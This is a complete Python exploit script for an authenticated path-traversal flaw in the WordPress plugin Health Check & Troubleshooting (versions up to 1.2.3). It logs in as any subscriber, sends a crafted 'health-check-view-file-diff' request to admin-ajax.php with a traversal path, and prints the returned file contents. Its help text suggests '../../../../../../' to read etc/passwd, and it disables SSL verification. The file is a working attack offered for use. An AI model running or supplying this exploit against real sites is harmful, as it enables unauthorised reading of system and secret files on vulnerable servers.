#!/usr/bin/env python3
import requests
import argparse
import os
import json
from io import StringIO
from html.parser import HTMLParser



#
# Exploit script by @RandomRobbieBF
#

http_proxy = ""
os.environ['HTTP_PROXY'] = http_proxy
os.environ['HTTPS_PROXY'] = http_proxy

# Ignore bad SSL
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()

class MLStripper(HTMLParser):
    def __init__(self):
        super().__init__()
        self.reset()
        self.strict = False
        self.convert_charrefs= True
        self.text = StringIO()
    def handle_data(self, d):
        self.text.write(d)
    def get_data(self):
        return self.text.getvalue()

def strip_tags(html):
    s = MLStripper()
    s.feed(html)
    return s.get_data()



def login_read_file(siteurl, wp_user, wp_pass,file):


    # Log in
    session = requests.Session()
    session.verify = False  # Ignore SSL verification
    login_url = siteurl + '/wp-login.php'
    response = session.post(login_url, verify=False, data={
        'log': wp_user,
        'pwd': wp_pass,
        'rememberme': 'forever',
        'wp-submit': 'Log+In'
    })
    # Confirm successful login
    if any('wordpress_logged_in' in cookie.name for cookie in session.cookies):
        print("Logged in successfully.")
    else:
        print("Failed to log in.")
        exit()
        
        
    paramsPost = {"action":"health-check-view-file-diff","file":file}
    headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/x-www-form-urlencoded"}
    response = session.post(""+siteurl+"/wp-admin/admin-ajax.php", data=paramsPost, headers=headers, verify=False)
    y = json.loads(response.text)
    rep = y['data']['message']
    j = strip_tags(rep)
    j = j.replace("Added:","")
    j = j.replace("Deleted:","")
    b = j.split("core.svn.wordpress.org Port 80</address>")
    print ("\n\n\n"+b[1]+"")


# Add the vulnerability description as a comment
DESCRIPTION = """
Health Check & Troubleshooting <= 1.2.3 - Subscriber+ Path Traversal
Description
The Health Check & Troubleshooting WordPress plugin was affected by an Authenticated Path Traversal security vulnerability.
"""


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=DESCRIPTION)
    parser.add_argument('--url', required=True, help='URL of the WordPress site')
    parser.add_argument('--username', required=True, help='WordPress username')
    parser.add_argument('--password', required=True, help='WordPress password')
    parser.add_argument('--file', required=True, help='File to read you will need to add ../../../../../../ to read etc/passwd')
    args = parser.parse_args()
    siteurl = args.url
    wp_user = args.username
    wp_pass = args.password
    file = args.file
    login_read_file(siteurl, wp_user, wp_pass,file)
